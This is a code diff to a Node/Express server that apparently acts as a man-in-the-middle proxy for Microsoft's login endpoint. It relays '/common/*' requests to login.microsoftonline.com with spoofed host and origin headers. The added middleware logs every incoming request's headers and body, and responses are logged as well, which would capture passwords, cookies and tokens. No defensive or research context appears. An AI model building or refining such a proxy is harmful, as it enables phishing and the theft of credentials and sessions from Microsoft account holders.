@@ -16,20 +16,23 @@ app.get("/", (req, res) => {
 });
 
 // Intercept and proxy requests to Microsoft
+// Log incoming requests for debugging
+app.use((req, res, next) => {
+  console.log("Incoming Request:", {
+    method: req.method,
+    path: req.path,
+    headers: req.headers,
+    body: req.body,
+  });
+  next();
+});
+
+// Proxy requests to Microsoft's endpoints
 app.use("/common/*", async (req, res) => {
   try {
-    console.log("Outgoing Request:", {
-    method: req.method,
-    url: targetUrl,
-    headers: {
-        ...req.headers,
-        host: "login.microsoftonline.com",
-        origin: "https://login.microsoftonline.com",
-    },
-    data: req.body,
-});
-    
     const targetUrl = `https://login.microsoftonline.com${req.originalUrl}`;
+    console.log("Target URL:", targetUrl);
+
     const response = await axios({
       method: req.method,
       url: targetUrl,
@@ -39,21 +42,23 @@ app.use("/common/*", async (req, res) => {
         origin: "https://login.microsoftonline.com",
       },
       data: req.body,
+      timeout: 15000, // 15 seconds timeout
     });
-    console.log('response.status', response.status);
-    console.log('response.data', response.data);
+
+    console.log("Response Status:", response.status);
+    console.log("Response Data:", response.data);
 
     res.status(response.status).send(response.data);
   } catch (error) {
     if (error.response) {
-        console.log("Proxy Error (Response):", error.response.data);
+      console.log("Proxy Error (Response):", error.response.data);
     } else if (error.request) {
-        console.log("Proxy Error (Request):", error.request);
+      console.log("Proxy Error (Request):", error.request);
     } else {
-        console.log("Proxy Error (Other):", error.message);
+      console.log("Proxy Error (Other):", error.message);
     }
     res.status(500).send("Proxy error occurred.");
-}
+  }
 });
 
 // Handle form submission
